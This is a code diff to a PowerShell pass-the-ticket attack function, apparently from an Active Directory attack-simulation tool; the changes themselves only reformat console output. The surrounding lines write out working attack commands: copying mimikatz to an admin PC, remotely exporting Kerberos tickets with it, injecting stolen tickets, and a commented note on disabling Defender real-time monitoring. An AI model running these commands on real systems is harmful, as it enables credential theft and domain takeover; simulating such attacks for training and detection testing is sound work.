@@ -100,9 +100,9 @@ function Invoke-PassTheTicketAttack {
 
     Write-AS2GoOutput -Type Header -Message "Stage mimikatz on Admin PC $Script:ASSAW"
 
-    Write-AS2GoOutput -Type Command -Message "Next Command: " -NoNewline
+    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
     $command = "Copy-Item -Path $tool1 -Destination $TicketsSourcePath  -Recurse"
-    Write-Syntax -Code $command
+    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
 
     #todo 
     #Invoke-Command -ComputerName $computer -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}
@@ -132,14 +132,14 @@ function Invoke-PassTheTicketAttack {
     ####################################################################################################################################
     Write-AS2GoOutput -Type Header -Message "harvest tickets on Admin PC $Script:ASSAW"
 
-    Write-AS2GoOutput -Type Command -Message "Next Command: " -NoNewline
+    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
     
     $command = '
     Invoke-Command -Session $session -ScriptBlock {
         Set-Location C:\Temp\tickets
         .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
     }'
-    Write-Syntax -Code $command
+    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
@@ -289,9 +289,9 @@ function Invoke-PassTheTicketAttack {
 
 
     Write-AS2GoOutput -Type Header -Message "load stolen tickets from candidate '$candidate'"
-    Write-AS2GoOutput -Type Command -Message "Next Command: " -NoNewline
+    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
     $command = [string]::Format('.\mimikatz.exe  "privilege::debug" "kerberos::ptt {0}" "exit"', $TicketsToAbusePath)
-    Write-Syntax -Code $command
+    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
 
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
@@ -304,9 +304,9 @@ function Invoke-PassTheTicketAttack {
     If (-not $SkipClearHost) { Clear-Host }
 
     Write-AS2GoOutput -Type Header -Message "Display currently cached Kerberos tickets"
-    Write-AS2GoOutput -Type Command -Message "Next Command: " -NoNewline
+    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
     $command = "klist"
-    Write-Syntax -Code $command
+    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
     
     Set-ASConfig -Setting "LastStage" -Value $Script:PtT
     Set-NewColorSchema -NewStage $Script:PtT
